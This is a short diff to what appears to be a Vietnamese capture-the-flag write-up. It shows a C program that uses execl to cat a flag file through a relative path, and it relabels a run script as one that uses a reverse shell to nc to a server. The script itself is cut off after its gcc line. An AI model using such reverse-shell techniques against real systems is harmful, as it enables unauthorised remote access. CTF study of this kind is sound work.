@@ -58,7 +58,7 @@ int main(void) {
     execl("/usr/bin/cat", "cat", "../../flag2", 0);
 }
 ```
-- File run script
+- File run script dùng reverse shell để nc tới server
 ```
 #!/usr/bin/bash
 gcc -o flag flag.c
